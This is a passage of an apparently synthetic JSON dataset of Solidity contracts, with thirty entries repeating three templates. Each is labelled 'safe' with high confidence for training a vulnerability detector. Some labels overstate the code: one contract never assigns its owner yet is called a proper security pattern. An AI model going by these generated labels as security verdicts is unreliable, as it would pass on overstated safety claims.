    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 422",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 423",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 424",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 425",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 426",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 427",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 428",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 429",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 430",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 431",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 432",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 433",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 434",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 435",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 436",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 437",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 438",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 439",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 440",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 441",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 442",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 443",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 444",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 445",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 446",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 447",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 448",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 449",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 450",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 451",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
